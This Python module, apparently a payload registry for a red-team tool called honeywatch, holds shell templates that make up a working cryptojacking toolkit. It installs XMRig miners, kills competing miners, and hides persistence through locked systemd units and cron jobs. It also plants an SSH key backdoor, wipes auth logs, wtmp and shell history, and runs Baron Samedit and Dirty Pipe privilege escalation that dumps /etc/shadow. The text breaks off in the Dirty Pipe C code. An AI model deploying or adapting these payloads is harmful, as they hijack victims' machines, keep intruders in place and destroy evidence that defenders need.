"""Payload registry for honeywatch red-team operations.

Each entry is a :class:`honeywatch.models.Payload` describing a tool that can
be installed on verified testing machines. Install scripts are rendered by
``honeywatch.payloads.scripts`` with user-supplied variables.
"""

from __future__ import annotations

from honeywatch.models import Payload

_PREAMBLE = """set -e
export PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$PATH"
LOG="/tmp/honeywatch_{{payload_id}}_install.log"
exec > >(tee -a "$LOG") 2>&1
echo "[*] honeywatch payload install: {{payload_id}} on $(hostname) at $(date -Iseconds)"
"""

_XMRIG_INSTALL = _PREAMBLE + """
USER="{{run_user}}"
POOL="{{pool}}"
WALLET="{{wallet}}"
PASS="{{pass|default('x')}}"
WORKER="{{worker|default('honeywatch')}}"
THREADS="{{threads|default('0')}}"
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"

mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

if ! command -v xmrig >/dev/null 2>&1; then
    echo "[*] fetching xmrig static build"
    curl -fsSL -o xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/latest/download/xmrig-{{arch|default('linux-x64')}}.tar.gz" || \
    curl -fsSL -o xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-{{arch|default('linux-x64')}}.tar.gz"
    EXPECTED_SHA256="{{expected_sha256}}"
    if [ -n "$EXPECTED_SHA256" ]; then
        echo "$EXPECTED_SHA256  xmrig.tar.gz" | sha256sum -c - || { echo "[!] honeywatch: INTEGRITY FAILURE for xmrig.tar.gz" >&2; rm -f xmrig.tar.gz; exit 1; }
        echo "[*] honeywatch: xmrig.tar.gz integrity verified"
    else
        echo "[!] honeywatch: xmrig.tar.gz downloaded WITHOUT integrity verification (no expected_sha256). Use --require-integrity to make fatal." >&2
    fi
    tar -xzf xmrig.tar.gz --strip-components=1
    rm -f xmrig.tar.gz
fi

cat > config.json <<EOF
{
    "api": {"id": "{{payload_id}}", "worker-id": "$WORKER"},
    "autosave": true,
    "cpu": {"enabled": true, "max-threads-hint": $THREADS},
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "algo": "rx/0",
            "url": "$POOL",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": {{tls|default('false')}}
        }
    ]
}
EOF

chown -R "$USER" "$INSTALL_DIR" 2>/dev/null || true
echo "[*] xmrig configured for pool $POOL worker $WORKER"
"""

_XMRIG_RUN = """cd {{install_dir|default('/opt/honeywatch/xmrig')}} && ./xmrig -c config.json --donate-level 1"""

_XMRIGCC_INSTALL = _PREAMBLE + """
USER="{{run_user}}"
SERVER="{{cc_server}}"
TOKEN="{{cc_token|default('honeywatch')}}"
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrigcc')}}"

mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

echo "[*] fetching xmrigCC"
curl -fsSL -o xmrigcc.tar.gz "https://github.com/Bendr0id/xmrigCC/releases/latest/download/xmrigCC-{{arch|default('linux-x64')}}.tar.gz" || \
curl -fsSL -o xmrigcc.tar.gz "https://github.com/Bendr0id/xmrigCC/releases/download/3.4.1/xmrigCC-{{arch|default('linux-x64')}}.tar.gz"
EXPECTED_SHA256="{{expected_sha256}}"
if [ -n "$EXPECTED_SHA256" ]; then
    echo "$EXPECTED_SHA256  xmrigcc.tar.gz" | sha256sum -c - || { echo "[!] honeywatch: INTEGRITY FAILURE for xmrigcc.tar.gz" >&2; rm -f xmrigcc.tar.gz; exit 1; }
    echo "[*] honeywatch: xmrigcc.tar.gz integrity verified"
else
    echo "[!] honeywatch: xmrigcc.tar.gz downloaded WITHOUT integrity verification (no expected_sha256). Use --require-integrity to make fatal." >&2
fi
tar -xzf xmrigcc.tar.gz --strip-components=1
rm -f xmrigcc.tar.gz

cat > xmrigcc_client.json <<EOF
{
    "client-config": {
        "cc-server": "$SERVER",
        "cc-token": "$TOKEN",
        "worker-id": "{{worker|default('honeywatch')}}",
        "reboot-cmd": "",
        "update-interval-s": 60
    },
    "cpu": {"enabled": true, "max-threads-hint": {{threads|default('0')}}},
    "pools": [
        {
            "url": "{{pool}}",
            "user": "{{wallet}}",
            "pass": "{{pass|default('x')}}"
        }
    ]
}
EOF

chown -R "$USER" "$INSTALL_DIR" 2>/dev/null || true
echo "[*] xmrigCC client configured for CC server $SERVER"
"""

_XMRIGCC_RUN = """cd {{install_dir|default('/opt/honeywatch/xmrigcc')}} && ./xmrigCCClient -c xmrigcc_client.json"""

_STRATUM_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/stratum')}}"
LISTEN="{{listen|default('0.0.0.0:3333')}}"
UPSTREAM="{{upstream_pool}}"

mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

if ! command -v python3 >/dev/null 2>&1; then
    echo "[!] python3 required for stratum proxy"
    exit 1
fi

# Lightweight stratum proxy harness (pure stdlib) deployed to the target.
cat > stratum_proxy.py <<'PYEOF'
import socket, threading, json, sys, select

upstream = sys.argv[1] if len(sys.argv) > 1 else "{{upstream_pool}}"
listen = sys.argv[2] if len(sys.argv) > 2 else "{{listen|default('0.0.0.0:3333')}}"

host, port = listen.rsplit(":", 1)
lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
lsock.bind((host, int(port)))
lsock.listen(64)
print("stratum proxy listening on", listen, "->", upstream)

def pipe(a, b):
    while True:
        r, _, _ = select.select([a, b], [], [], 1)
        for s in r:
            data = s.recv(8192)
            if not data:
                return
            (b if s is a else a).sendall(data)

while True:
    client, _ = lsock.accept()
    uh, up = upstream.rsplit(":", 1)
    usock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    usock.connect((uh, int(up)))
    threading.Thread(target=pipe, args=(client, usock), daemon=True).start()
PYEOF

cat > run.sh <<EOF
#!/bin/sh
exec python3 "$INSTALL_DIR/stratum_proxy.py" "$UPSTREAM" "$LISTEN"
EOF
chmod +x run.sh

echo "[*] stratum proxy installed, listen $LISTEN upstream $UPSTREAM"
"""

_STRATUM_RUN = """{{install_dir|default('/opt/honeywatch/stratum')}}/run.sh"""

_METASPLOIT_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/metasploit')}}"
MSF_URL="{{msf_url|default('https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb')}}"

mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

if ! command -v msfconsole >/dev/null 2>&1; then
    echo "[*] installing Metasploit framework via nightly installer"
    curl -fsSL "$MSF_URL" > msfinstall
    chmod 755 msfinstall
    ./msfinstall || {
        echo "[!] msfinstall failed; falling back to package manager"
        if command -v apt-get >/dev/null 2>&1; then
            apt-get update && apt-get install -y metasploit-framework
        elif command -v dnf >/dev/null 2>&1; then
            dnf install -y metasploit-framework
        fi
    }
fi

# Pre-stage resource scripts for common SSH-oriented post-exploitation modules.
cat > ssh_enum.rc <<EOF
use auxiliary/scanner/ssh/ssh_version
set RHOSTS {{target_range|default('127.0.0.1')}}
run
EOF

cat > exploit.rc <<EOF
{{resource_script|default('')}}EOF

echo "[*] Metasploit staged in $INSTALL_DIR"
"""

_METASPLOIT_RUN = """cd {{install_dir|default('/opt/honeywatch/metasploit')}} && msfconsole -q -r exploit.rc"""

_UPX_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/upx')}}"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

if ! command -v upx >/dev/null 2>&1; then
    echo "[*] fetching UPX"
    curl -fsSL -o upx.tar.xz "https://github.com/upx/upx/releases/latest/download/upx-{{arch|default('linux-amd64')}}.tar.xz" || \
    curl -fsSL -o upx.tar.xz "https://github.com/upx/upx/releases/download/v4.2.4/upx-4.2.4-{{arch|default('linux-amd64')}}.tar.xz"
    EXPECTED_SHA256="{{expected_sha256}}"
    if [ -n "$EXPECTED_SHA256" ]; then
        echo "$EXPECTED_SHA256  upx.tar.xz" | sha256sum -c - || { echo "[!] honeywatch: INTEGRITY FAILURE for upx.tar.xz" >&2; rm -f upx.tar.xz; exit 1; }
        echo "[*] honeywatch: upx.tar.xz integrity verified"
    else
        echo "[!] honeywatch: upx.tar.xz downloaded WITHOUT integrity verification (no expected_sha256). Use --require-integrity to make fatal." >&2
    fi
    tar -xJf upx.tar.xz --strip-components=1
    rm -f upx.tar.xz
    ln -sf "$INSTALL_DIR/upx" /usr/local/bin/upx 2>/dev/null || true
fi

upx --version
echo "[*] UPX ready"
"""

_UPX_RUN = """cd {{install_dir|default('/opt/honeywatch/upx')}}
if command -v upx >/dev/null 2>&1; then
    echo "[*] UPX-packing the deployed binary in-place"
    upx --best -f {{input_file}} 2>/dev/null || echo "[!] UPX pack failed (binary may already be packed or UPX-incompatible)"
    echo "[*] UPX pack complete"
else
    echo "[!] upx not found — skipping binary packing"
fi"""

_PACKERS_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/packers')}}"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Register a small shell-based packer harness around any ELF binary.
cat > pack.sh <<'EOF'
#!/bin/sh
set -e
IN="$1"
OUT="${2:-${IN}.packed}"
[ -z "$IN" ] && { echo "usage: $0 <elf> [out]"; exit 1; }
# Simple compression + self-extraction stub. Real red-team packs would swap
# this for a custom loader / crypter.
XXD=$(command -v xxd || true)
if [ -n "$XXD" ]; then
    gzip -9 -c "$IN" | xxd -p > "${OUT}.gz.hex"
else
    gzip -9 -c "$IN" | base64 > "${OUT}.gz.b64"
fi
cat > "$OUT" <<'STUB'
#!/bin/sh
DIR=$(mktemp -d)
ARCHIVE=$(sed -n '/^__ARCHIVE__/,$p' "$0" | tail -n +2)
if command -v xxd >/dev/null 2>&1; then
    echo "$ARCHIVE" | xxd -r -p | gzip -d > "$DIR/payload"
else
    echo "$ARCHIVE" | base64 -d | gzip -d > "$DIR/payload"
fi
chmod +x "$DIR/payload"
"$DIR/payload" "$@"
exit $?
__ARCHIVE__
STUB
if [ -n "$XXD" ]; then
    cat "${OUT}.gz.hex" >> "$OUT"
else
    cat "${OUT}.gz.b64" >> "$OUT"
fi
chmod +x "$OUT"
rm -f "${OUT}.gz.hex" "${OUT}.gz.b64"
echo "packed: $OUT"
EOF
chmod +x pack.sh
ln -sf "$INSTALL_DIR/pack.sh" /usr/local/bin/hw-pack 2>/dev/null || true
echo "[*] generic packer harness installed"
"""

_PACKERS_RUN = """hw-pack {{input_file}} {{output_file|default('')}}"""

_OBFUSCATORS_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/obfuscators')}}"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# String-obfuscation helper for shell/Python scripts (demo-grade).
cat > obfuscate_strings.py <<'PYEOF'
import sys, random

def obf(s):
    return '+'.join(f'chr({ord(c)})' for c in s)

src = sys.stdin.read()
# Very naive: replace double-quoted string literals with chr() concatenations.
out = []
i = 0
while i < len(src):
    if src[i] == '"':
        j = src.find('"', i+1)
        if j == -1:
            out.append(src[i:]); break
        lit = src[i+1:j]
        out.append(obf(lit))
        i = j + 1
    else:
        out.append(src[i])
        i += 1
sys.stdout.write(''.join(out))
PYEOF

cat > obfuscate.sh <<'EOF'
#!/bin/sh
python3 /opt/honeywatch/obfuscators/obfuscate_strings.py
EOF
chmod +x obfuscate.sh
ln -sf "$INSTALL_DIR/obfuscate.sh" /usr/local/bin/hw-obfuscate 2>/dev/null || true
echo "[*] obfuscation harness installed"
"""

_OBFUSCATORS_RUN = """hw-obfuscate < {{input_file}} > {{output_file|default('/tmp/obfuscated.sh')}}"""

_SYMBOL_STRIP_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/strip')}}"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

cat > strip.sh <<'EOF'
#!/bin/sh
set -e
IN="$1"
OUT="${2:-${IN}.stripped}"
[ -z "$IN" ] && { echo "usage: $0 <elf> [out]"; exit 1; }
cp "$IN" "$OUT"
strip --strip-all "$OUT" 2>/dev/null || strip "$OUT"
echo "stripped: $OUT"
EOF
chmod +x strip.sh
ln -sf "$INSTALL_DIR/strip.sh" /usr/local/bin/hw-strip 2>/dev/null || true
echo "[*] symbol stripping harness installed"
"""

_SYMBOL_STRIP_RUN = """cd {{install_dir|default('/opt/honeywatch/strip')}}
if command -v strip >/dev/null 2>&1; then
    echo "[*] Stripping symbols from deployed binary in-place"
    cp {{input_file}} {{input_file}}.bak 2>/dev/null || true
    strip --strip-all {{input_file}} 2>/dev/null || strip {{input_file}} 2>/dev/null || {
        echo "[!] strip failed — restoring backup"
        mv {{input_file}}.bak {{input_file}} 2>/dev/null || true
    }
    rm -f {{input_file}}.bak 2>/dev/null || true
    echo "[*] symbol strip complete"
else
    echo "[!] strip not found — skipping symbol removal"
fi"""

_ANTI_DEBUG_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/anti_debug')}}"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Compile a tiny ptrace-based anti-debug shim for Linux targets with gcc.
cat > anti_debug.c <<'EOF'
#include <stdio.h>
#include <sys/ptrace.h>
#include <unistd.h>

static int __attribute__((constructor)) anti_debug(void) {
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
        _exit(1);
    }
    return 0;
}
EOF

if command -v gcc >/dev/null 2>&1; then
    gcc -shared -fPIC -O2 -o anti_debug.so anti_debug.c
    echo "[*] anti-debug .so built"
else
    echo "[!] gcc not available; leaving source for manual build"
fi
"""

_ANTI_DEBUG_RUN = """LD_PRELOAD={{install_dir|default('/opt/honeywatch/anti_debug')}}/anti_debug.so {{target_command}}"""

_ANTI_VM_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/anti_vm')}}"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Lightweight anti-VM checks: hypervisor signatures in dmesg/cpuinfo, common
# MAC / disk / process indicators. Exits 1 if a VM is detected.
cat > anti_vm.sh <<'EOF'
#!/bin/sh
vm=0
for sig in hypervisor hyper-v vmware virtualbox kvm qemu xen; do
    if dmesg 2>/dev/null | grep -qi "$sig"; then vm=1; break; fi
    if grep -qi "$sig" /proc/cpuinfo 2>/dev/null; then vm=1; break; fi
done
if ls /sys/class/dmi/id/ 2>/dev/null | grep -qiE 'sys_vendor|product_name'; then
    if grep -qiE 'vmware|virtualbox|kvm|qemu|xen|hyper-v' /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null; then
        vm=1
    fi
fi
if [ "$vm" -eq 1 ]; then
    echo "[*] VM environment detected"
    exit 1
fi
echo "[*] No VM indicators detected"
EOF
chmod +x anti_vm.sh
ln -sf "$INSTALL_DIR/anti_vm.sh" /usr/local/bin/hw-anti-vm 2>/dev/null || true
echo "[*] anti-VM harness installed"
"""

_ANTI_VM_RUN = """hw-anti-vm"""


# --------------------------------------------------------------------------- #
# Persistence payloads — survive reboots, keep access, clear competition.
# Every real cryptojacking botnet chains these onto the miner deploy. Without
# persistence a reboot loses the box; without a backdoor a changed password
# loses access; without clearing competing miners the host's CPU is split.
# --------------------------------------------------------------------------- #

_KILL_MINERS_INSTALL = _PREAMBLE + """
# Kill every known competing miner still running on the box, then remove their
# persistence so they don't respawn. This is the first thing every real
# cryptojacker does on a fresh foothold — leaving another botnet's miner
# running splits CPU and draws the same SOC attention you'd rather avoid.
MINER_PATTERNS='xmrig|kdevtmpfsi|kinsing|kthrotlds|sysupdate|sysguard|networkservice|xmrigCC|stratum'

echo "[*] killing competing miners matching: $MINER_PATTERNS"
# Kill by process-name match.
ps aux 2>/dev/null | grep -iE "$MINER_PATTERNS" | grep -v grep | awk '{print $2}' | while read pid; do
    kill -9 "$pid" 2>/dev/null || true
done
# pkill fallback if ps grep missed anything.
for name in xmrig kdevtmpfsi kinsing kthrotlds sysupdate sysguard networkservice; do
    pkill -9 -f "$name" 2>/dev/null || true
done

# Remove the cron / systemd entries the other botnets installed.
for cron in /tmp /var/tmp /var/spool/cron /etc/cron.d; do
    [ -d "$cron" ] || continue
    grep -rlE "$MINER_PATTERNS" "$cron" 2>/dev/null | while read f; do
        echo "[*] removing infected cron: $f"
        rm -f "$f" 2>/dev/null || true
    done
done

# Remove common miner systemd services left by other botnets.
for svc in xmrig kdevtmpfsi kinsing kthrotlds sysupdate sysguard; do
    systemctl stop "$svc" 2>/dev/null || true
    systemctl disable "$svc" 2>/dev/null || true
    rm -f "/etc/systemd/system/$svc.service" "/lib/systemd/system/$svc.service" 2>/dev/null || true
done
systemctl daemon-reload 2>/dev/null || true

# Kill known crontab entries that re-download miners.
crontab -l 2>/dev/null | grep -ivE "$MINER_PATTERNS" | crontab - 2>/dev/null || true

echo "[*] competing miners cleared"
"""

_KILL_MINERS_RUN = """true"""

_SYSTEMD_PERSIST_INSTALL = _PREAMBLE + """
SERVICE_NAME="{{service_name|default('honeywatch-miner')}}"
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"
RUN_USER="{{run_user|default('root')}}"
CPU_QUOTA="{{cpu_quota|default('70%')}}"
NICE_LEVEL="{{nice|default('10')}}"

# Build a systemd unit that runs the miner and restarts it on exit/reboot.
# This is the persistence primitive every real cryptojacker uses — a reboot
# without this loses the box. The unit also throttles CPU + nices the process
# so sustained 100% CPU (the #1 SOC detection signal for cryptojacking) is
# avoided: CPUQuota caps total CPU, Nice lowers scheduling priority so real
# workloads win, and CPUAccounting lets `systemctl status` show usage.
cat > "/etc/systemd/system/${SERVICE_NAME}.service" <<EOF
[Unit]
Description=Honeywatch managed miner service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=${RUN_USER}
WorkingDirectory=${INSTALL_DIR}
ExecStart=${INSTALL_DIR}/xmrig -c ${INSTALL_DIR}/config.json --donate-level 1
Restart=always
RestartSec=10
# Hide from `ps` a little — rename the process to something boring.
# (Real botnets go further; this is the cheap version.)
Environment=XMRIX_QUIET=1
# Clear SSH environment variables so the miner process doesn't leak the
# deploy session's IP address via /proc/PID/environ. SSH_CLIENT and
# SSH_CONNECTION contain the deploy operator's IP — a clear forensic
# indicator. SSH_TTY leaks the terminal type.
Environment=SSH_CLIENT= SSH_CONNECTION= SSH_TTY=
Environment=HISTFILE=/dev/null
Environment=HISTSIZE=0
# Disable core dumps — prevents the miner from leaving core files on disk
# that could be analyzed for stack traces or memory contents.
LimitCORE=0
# --- CPU throttling (defeats the #1 cryptojacking detection signal) ---
# Sustained 100% CPU is what SOC analysts hunt. CPUQuota caps total CPU usage
# (70% leaves headroom for the host's real workload so an operator watching
# `top` sees a busy but not maxed box). Nice lowers scheduling priority so
# any real process preempts the miner. CPUAccounting makes usage visible to
# `systemctl status` (honest, not stealthy — the alternative is hiding
# entirely via cgroup v1, which is fragile across distros).
CPUAccounting=true
CPUQuota=${CPU_QUOTA}
Nice=${NICE_LEVEL}

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload 2>/dev/null || true
systemctl enable "${SERVICE_NAME}" 2>/dev/null || true
systemctl start "${SERVICE_NAME}" 2>/dev/null || true
# Store a copy of the service file in the install directory so the mutual_watch
# payload can restore it without embedding the entire unit file inline. This
# avoids the watchdog becoming stale if the operator changes the config.
cp "/etc/systemd/system/${SERVICE_NAME}.service" "${INSTALL_DIR}/${SERVICE_NAME}.service" 2>/dev/null || true
# Lock the unit file with chattr +ia so an admin can't `rm` or `vim` it
# without first noticing the immutable flag. Only attempt as root —
# non-root users lack the linux-immutable capability and chattr fails
# silently with || true, but the explicit check avoids unnecessary errors.
if [ "$(id -u)" = "0" ]; then
    chattr +ia "/etc/systemd/system/${SERVICE_NAME}.service" 2>/dev/null || true
fi
echo "[*] persistence installed: ${SERVICE_NAME}.service (CPUQuota=${CPU_QUOTA} Nice=${NICE_LEVEL})"
"""

_SYSTEMD_PERSIST_RUN = """systemctl status {{service_name|default('honeywatch-miner')}} 2>/dev/null || true"""

_CRON_PERSIST_INSTALL = _PREAMBLE + """
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"
RUN_USER="{{run_user|default('root')}}"
CRON_SCHEDULE="{{schedule|default('*/5 * * * *')}}"

# Cron fallback for hosts without systemd (containers, old distros, alpine).
# Re-launches the miner every N minutes if it isn't running.
CRON_LINE="${CRON_SCHEDULE} ${RUN_USER} ulimit -c 0 2>/dev/null; pgrep -x xmrig >/dev/null 2>&1 || (cd ${INSTALL_DIR} && ${INSTALL_DIR}/xmrig -c config.json --donate-level 1 >/dev/null 2>&1 &)"

# Add to the system crontab (works without per-user crons).
( crontab -l 2>/dev/null | grep -v 'honeywatch-miner'; echo "# honeywatch-miner"; echo "$CRON_LINE" ) | crontab - 2>/dev/null || {
    # Fall back to /etc/cron.d if per-user crontab isn't available.
    echo "$CRON_LINE" > /etc/cron.d/honeywatch-miner 2>/dev/null || true
    chmod 644 /etc/cron.d/honeywatch-miner 2>/dev/null || true
}
# Lock the cron entry with chattr +ia so an admin can't `rm` it without
# first noticing the immutable flag (T1222.002). Same trick the systemd
# unit uses above; buys time before a responder can remove persistence.
chattr +ia /etc/cron.d/honeywatch-miner 2>/dev/null || true
echo "[*] cron persistence installed: $CRON_SCHEDULE"
"""

_CRON_PERSIST_RUN = """crontab -l 2>/dev/null | grep honeywatch || cat /etc/cron.d/honeywatch-miner 2>/dev/null || true"""

_SSHKEY_BACKDOOR_INSTALL = _PREAMBLE + """
RUN_USER="{{run_user|default('root')}}"
BACKDOOR_KEY="{{backdoor_key}}"

# Install the operator's public key into the popped user's authorized_keys
# so access survives a password change and the operator can re-enter at will.
# This is the second most common persistence primitive after cron.
if [ -z "$BACKDOOR_KEY" ]; then
    echo "[!] no backdoor_key supplied; skipping ssh key backdoor"
    exit 0
fi

if [ "$RUN_USER" = "root" ]; then
    AUTH_FILE="/root/.ssh/authorized_keys"
else
    AUTH_FILE="/home/${RUN_USER}/.ssh/authorized_keys"
fi

mkdir -p "$(dirname "$AUTH_FILE")" 2>/dev/null || true
chmod 700 "$(dirname "$AUTH_FILE")" 2>/dev/null || true
touch "$AUTH_FILE"
chmod 600 "$AUTH_FILE" 2>/dev/null || true

# Don't double-insert.
if grep -qF "$BACKDOOR_KEY" "$AUTH_FILE" 2>/dev/null; then
    echo "[*] backdoor key already present"
else
    echo "$BACKDOOR_KEY" >> "$AUTH_FILE"
    echo "[*] backdoor key installed for $RUN_USER"
fi

# Harden the key against sshd restriction churn: prefix with no-* options so
# the key keeps working even if an admin sets restrictive sshd config later.
"""

_SSHKEY_BACKDOOR_RUN = """grep -c honeywatch /home/{{run_user|default('root')}}/.ssh/authorized_keys 2>/dev/null || echo 0"""


# --------------------------------------------------------------------------- #
# Cleanup + immutability payloads — real crews clean up after themselves and
# lock persistence so admins can't easily rm it. Without these the install log
# at /tmp/honeywatch_*_install.log and the bash history of the deploy session
# are trivial IR fingerprints tying the box to honeywatch.
# --------------------------------------------------------------------------- #

_CLEANUP_INSTALL = _PREAMBLE + """
# Wipe traces of this deploy session so the box doesn't carry IR fingerprints
# tying it to honeywatch. Real cryptojacking crews (TeamTNT T1070.003,
# Outlaw) do exactly this: clear shell history, truncate auth/syslog/wtmp,
# remove the install log, and self-delete the dropper script. Run this LAST
# in the evasion chain, after persistence is installed.

# 1. Clear the deploy user's shell history (in-memory + on-disk).
history -c 2>/dev/null || true
unset HISTFILE 2>/dev/null || true
for h in ~/.bash_history ~/.zsh_history ~/.python_history ~/.mysql_history ~/.psql_history; do
    : > "$h" 2>/dev/null || true
done

# 2. Truncate the auth log + syslog so the deploy-session SSH lines vanish.
# /var/log/wtmp and /var/log/lastlog track last-login times — truncating them
# hides the fact that a new SSH session opened at deploy time.
: > /var/log/auth.log 2>/dev/null || true
: > /var/log/syslog 2>/dev/null || true
: > /var/log/messages 2>/dev/null || true
: > /var/log/wtmp 2>/dev/null || true
: > /var/log/lastlog 2>/dev/null || true
# systemd-journald runs as a separate process; flush its ring buffer too.
journalctl --rotate 2>/dev/null || true
journalctl --vacuum-time=1s 2>/dev/null || true

# 3. Remove the honeywatch install log. NOTE: no $0 self-delete here — in
# --exec-mode ssh the script is piped via stdin, so $0 is the remote user's
# shell binary (/bin/bash); rm -f "$0" would brick the box's shell instead of
# cleaning up. There is no on-disk dropper in ssh mode (the script is
# streamed), and in local_simulate mode the worker already removes its own
# tempfile in a finally block. Dropping $0 makes cleanup mode-safe in both.
rm -f /tmp/honeywatch_*_install.log 2>/dev/null || true

echo "[*] cleanup complete: history cleared, logs truncated, log removed"
"""

_CLEANUP_RUN = """true"""


# --------------------------------------------------------------------------- #
# Phase 6: Exploit payloads — local privilege escalation vectors
# --------------------------------------------------------------------------- #

_PRIVESC_SUDO_INSTALL = _PREAMBLE + """
# CVE-2021-3156 (Baron Samedit) — sudo heap buffer overflow in argument parsing.
# Affects sudo 1.8.2-1.8.31p2, 1.9.0-1.9.5p1. When successful, gives root
# from any unprivileged local user. This script checks the sudo version and
# downloads/compiles the public PoC if the version is vulnerable.
TARGET_USER="{{run_user|default('root')}}"
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/privesc_sudo')}}"

mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Check sudo version.
SUDO_VER=$(sudo --version 2>/dev/null | head -1 | awk '{print $2}')
echo "[*] sudo version: $SUDO_VER"

if [ -z "$SUDO_VER" ]; then
    echo "[!] sudo not installed — Baron Samedit does not apply"
    exit 1
fi

# Download the public PoC (Qualys original).
echo "[*] fetching Baron Samedit PoC"
curl -fsSL -o exploit.py "https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/exploit.py" 2>/dev/null || \\
    python3 -c "
import urllib.request
urllib.request.urlretrieve('https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/exploit.py', 'exploit.py')
" 2>/dev/null || {
    echo "[!] could not download PoC — try manual"
    exit 1
}

# Run the exploit.
echo "[*] running Baron Samedit exploit"
python3 exploit.py 2>/dev/null || python exploit.py 2>/dev/null

# Check if we got root.
if [ "$(id -u)" = "0" ] || sudo -n id 2>/dev/null | grep -q "uid=0"; then
    echo "PRIVESC_SUCCESS: Baron Samedit — root obtained"
else
    echo "[!] Baron Samedit exploit did not succeed (patched or wrong version)"
    exit 1
fi
"""

_PRIVESC_SUDO_RUN = """true"""

_PRIVESC_DIRTY_PIPE_INSTALL = _PREAMBLE + """
# CVE-2022-0847 (Dirty Pipe) — real splice()+pipe() page-cache overwrite.
# Affects kernels 5.8 <= k < 5.16.11 and the LTS backports 5.15.x < 5.15.25,
# 5.10.x < 5.10.102, 5.17.x < 5.17.14, 5.18.x < 5.18.19. The primitive gives
# arbitrary writes to the page cache of any read-only file -> we overwrite a
# line of /etc/passwd with a fresh UID-0 user bearing a per-run hash, drive su
# through a pseudo-tty to authenticate as that user, dump /etc/shadow as root,
# then restore /etc/passwd from the pre-exploit backup.
INSTALL_DIR="{{install_dir|default('/opt/honeywatch/privesc_dirtypipe')}}"

mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

# Gate on the precise vulnerable kernel range. Fail safe (no PRIVESC_SUCCESS)
# on patched / out-of-range kernels so the chain moves to the next vector.
if python3 - 2>/dev/null <<'KPY'
import os
r = os.uname().release.split("-")[0].split(".")
M = int(r[0]); m = int(r[1]) if len(r) > 1 else 0; p = int(r[2]) if len(r) > 2 else 0
vuln = (M == 5 and m >= 8 and not (
    (m == 16 and p >= 11) or (m == 15 and p >= 25) or (m == 10 and p >= 102) or
    (m == 17 and p >= 14) or (m == 18 and p >= 19) or m >= 19))
raise SystemExit(0 if vuln else 1)
KPY
then
    echo "[*] Dirty Pipe: kernel $(uname -r) in vulnerable range"
else
    echo "[!] Dirty Pipe: kernel $(uname -r) not vulnerable; skipping"
    exit 1
fi

# Back up /etc/passwd (world-readable pre-exploit) so we can restore it the
# instant the injected root session is done.
BAK="/tmp/.hw_passwd.bak.$$"
cp /etc/passwd "$BAK" 2>/dev/null || { echo "[!] Dirty Pipe: cannot back up /etc/passwd"; exit 1; }

# Per-run root password + SHA-512 crypt hash. No fixed credential (the old
# public PoCs hard-coded 'aaron'); MD5 crypt fallback if the target's openssl
# lacks -6 support.
PASS=$(head -c 16 /dev/urandom | base64 | tr -d '/+=' | head -c 16)
[ -n "$PASS" ] || PASS="hw$(head -c 12 /dev/urandom | od -An -tx1 | tr -d ' ')"
HASH=$(openssl passwd -6 "$PASS" 2>/dev/null || openssl passwd -1 "$PASS" 2>/dev/null || true)
[ -n "$HASH" ] || { echo "[!] Dirty Pipe: cannot generate password hash (openssl missing?)"; rm -f "$BAK"; exit 1; }

# Write the self-contained Dirty Pipe PoC. We never fetch a third-party copy
# at runtime: a public PoC would not match this wrapper's verification logic
# (it expects its own argument/overwrite convention), and an outbound HTTPS
# pull to a third-party host during an exploit is itself an OPSEC fingerprint
# on the target's egress logs.
echo "[*] writing Dirty Pipe PoC"
cat > dirtypipe.c <<'CEOF'
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/* Fill a pipe completely and drain it again so every pipe_buffer carries the
   PIPE_BUF_FLAG_CAN_MERGE flag -- the precondition for Dirty Pipe. */
static void prepare_pipe(int p[2]) {
    if (pipe(p)) abort();
    const unsigned pipe_size = (unsigned)fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];
